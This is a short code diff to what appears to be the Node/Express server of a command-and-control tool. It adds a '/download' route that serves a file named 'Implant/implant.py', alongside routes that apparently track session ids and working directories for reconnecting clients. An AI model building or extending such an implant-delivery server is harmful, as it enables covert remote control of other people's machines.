@@ -29,6 +29,10 @@ app.get('/', (req, res) => {
 	res.send(`${sid}`);
 });
 
+app.get('/download', (req, res) => {
+	res.download('Implant/implant.py')
+})
+
 app.get('/reconnect', (req, res) => {
 	var sid = req.query.sid;
 	var cwd = req.query.cwd;
